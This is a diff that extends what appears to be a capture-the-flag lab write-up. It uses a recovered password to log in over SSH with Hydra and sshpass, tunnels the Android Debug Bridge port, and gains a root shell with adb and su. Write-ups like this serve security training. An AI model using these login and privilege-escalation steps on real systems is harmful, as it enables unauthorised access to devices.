@@ -131,3 +131,34 @@ Downloading `creds.jpg`:
 
 `kristi : Kr1sT!5h@Rp3xPl0r3!`
 
+## SSH as kristi
+```console
+# hydra -l kristi -p 'Kr1sT!5h@Rp3xPl0r3!' -s 2222 ssh://10.10.10.247                                                                                                                                          255 ⨯
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-03 22:43:14
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
+[DATA] attacking ssh://10.10.10.247:2222/
+[2222][ssh] host: 10.10.10.247   login: kristi   password: Kr1sT!5h@Rp3xPl0r3!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-03 22:43:15
+```
+
+```console
+# sshpass -p 'Kr1sT!5h@Rp3xPl0r3!' ssh -p 2222 kristi@10.10.10.247
+```
+
+## Privesc
+### ADB Shell
+
+```console
+sshpass -p 'Kr1sT!5h@Rp3xPl0r3!' ssh -p 2222 -L 5555:localhost:5555 kristi@10.10.10.247
+```
+
+Obtaining root shell via ADB (Android Debug) shell
+```
+adb connect localhost:5555
+adb shell
+su
+```
